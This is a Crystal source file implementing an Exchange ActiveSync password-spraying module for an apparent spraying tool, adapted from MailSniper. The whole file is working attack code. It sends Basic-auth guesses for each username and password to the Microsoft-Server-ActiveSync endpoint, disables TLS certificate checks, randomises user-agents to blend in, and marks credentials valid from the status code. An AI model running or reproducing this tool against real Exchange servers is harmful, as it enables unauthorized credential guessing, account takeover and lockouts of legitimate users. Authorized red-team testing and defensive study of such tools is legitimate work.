require "http/client"
require "base64"
require "colorize"

##
# much of the logic for this module is taken from dafthack's mailsniper
# see his original code here: https://github.com/dafthack/MailSniper
##



class ExchageEAS < Sprayer
    property domain : String

    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "WORKGROUP"
    end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        # lockedout = false
        # valid = false
        # mfa = false
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 
        # 
        # enter your auth check here and make sure 
        #


        if @target == "" || @domain == "WORKGROUP"
            STDERR.puts "You need to set a target and/or a domain..... dummy!!!"
            exit 1
        end

        # url = URI.parse( "https://#{@target}/Microsoft-Server-ActiveSync" )
        url = URI.parse @target 
        path = "/Microsoft-Server-ActiveSync"
        
        
        # context = OpenSSL::SSL::Context::Client.insecure
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        client = HTTP::Client.new(url, tls: context)
        header = HTTP::Headers{
            "Authorization" => "Basic #{ Base64.strict_encode( "#{@domain}\\#{username}:#{password}" ) }",
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
        }

        page = nil
        while !page # after a while ocasionally a dns entry may go awry... not sure.... just check again and it should be fine
            begin 
                page = client.get( "#{"/#{url.path.strip("/")}" if url.path != "" }#{path}" , headers: header )
            rescue e
                # STDERR.puts  e.message 
                STDERR.puts "ERROR: oops something happend (blame dns) Retrying..."
                sleep 2 
            end
        end

        if page.status_code == 505
            # valid = true 
            spstatus.valid_credentials = true 
        end




        #
        # end of your auth check here
        # 
        
        # return [username, password, valid, lockedout, mfa]
        return spstatus
    end
end